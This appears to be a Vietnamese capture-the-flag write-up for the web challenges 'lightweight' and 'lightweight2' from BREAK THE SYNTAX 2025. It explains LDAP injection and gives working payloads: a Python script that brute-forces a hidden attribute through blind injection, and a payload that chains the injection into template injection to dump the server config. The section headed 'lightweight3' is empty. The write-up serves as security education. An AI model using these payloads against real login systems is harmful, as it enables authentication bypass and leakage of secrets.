---
title: "BREAK THE SYNTAX\t2025"
tags: ["web"]
---

# BREAK THE SYNTAX 2025

![image](https://hackmd.io/_uploads/r19jVU3xxg.png)
![image](https://hackmd.io/_uploads/H1VTVU3exg.png)

![image](https://hackmd.io/_uploads/H1fD1QRxxl.png)

## lightweight

Auke đây là chủ đề khá mới LDAP injection
1 chút thông tin về LDAP
:::success
Viết tắt : Lightweight Directory Access Protocol

1. Chức năng : Dùng để truy vấn và cập nhật thông tin từ 1 cơ sở dữ liệu thư mục
2. Cấu trúc dữ liệu : Tổ chức giống như cây thư mục

- mỗi mục được xác định bởi 1 tên duy nhất ví dụ : `cn=John Doe,ou=Users,dc=example,dc=com`

3. Mô hình hoạt động : Client - server . Ở phía client gửi request đến server sau đó trả về kết quả

Vậy LDAPi là gì : untrusted data rơi vào cấu LDAP
:::
![image](https://hackmd.io/_uploads/Bkru1SCxex.png)
Anh hacker có thể làm gì?
:::warning
Chèn thêm đoạn query khác vào
:::

đó là trường username = `*)(description=a*` & pass = `*`
Khi này câu query sẽ trở thành `(&(employeeType=active)(uid=*)(description=a*)(userPassword=*))` -> tìm các tài khoản đang hoạt động với uid và pass bất kì , với thuộc tính miêu tả là a `+` với 1 `bất kì chữ cái nào cũng được `
dựa vào luận lí đoạn code ở trên ta có thể inject Blind được ròi

```python=
import requests
import urllib.parse
import time

url = 'https://lightweight.chal.bts.wh.edu.pl/'
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!@#$%^&*()'
known_prefix = ''  # Nếu biết trước phần đầu flag
max_len = 50

flag = known_prefix

for i in range(len(flag), max_len):
    found = False
    for c in charset:
        injected_username = f'''*)(description={flag + c}*'''
        data = {
            'username': injected_username,
            'password': '*'
        }

        try:
            response = requests.post(url, data=data, timeout=5)


            # Kiểm tra dựa trên status code và nội dung phản hồi
            if response.status_code == 200 and "Invalid credentials" not in response.text:
                flag += c
                print(f"[+] Found char: {c} --> {flag}")
                found = True
                break
        except requests.RequestException as e:
            print(f"[!] Error: {e}. Retrying after 1s...")
            time.sleep(1)
            continue

    if not found:
        print("[!] Injection failed or flag ended.")
        break

print(f"Final flag: {flag}")
```

![image](https://hackmd.io/_uploads/S1yk9Lnexg.png)

## lightweight2

Bài này giống bài trên chỉ khác nó có vẻ như đang sanitize những kí tự đặc biệt khiến cho payload ở bài 1 không còn hoạt động hiểu quả
payload

```python=
(userPassword:2.5.13.18:=\ff{{config}})
```

![image](https://hackmd.io/_uploads/BknetSCxgx.png)
Bằng 1 cách thần kì nào đó thig `{}` đi theo con đường này không bị sanitize 😂
![image](https://hackmd.io/_uploads/Hyy8FBAegx.png)

Và sau đó nó rơi vào `render_template` -> SSTI -> lộ file cấu hình
câu truy vấn sẽ là :

```python==
(&(employeeType=active)(uid=*)(userPassword:2.5.13.18:=\ff{{config}})(userPassword=*))
```

![image](https://hackmd.io/_uploads/Sk3KYSRxxe.png)

## lightweight3
